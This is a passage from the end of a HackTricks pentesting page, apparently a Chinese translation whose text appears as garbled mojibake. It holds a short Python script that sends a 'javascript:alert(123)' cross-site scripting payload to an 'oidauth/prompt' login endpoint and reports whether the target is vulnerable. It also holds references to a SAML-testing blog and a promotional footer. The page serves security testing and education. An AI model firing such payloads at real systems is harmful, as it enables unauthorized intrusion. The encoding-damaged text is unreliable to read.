url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## å‚è€ƒèµ„æ–™

è¿™äº›æ”»å‡»æ˜¯ä»[https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)è·å–çš„\
æ‚¨å¯ä»¥åœ¨[https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)æ‰¾åˆ°å…¶ä»–èµ„æºå’Œè§£æã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
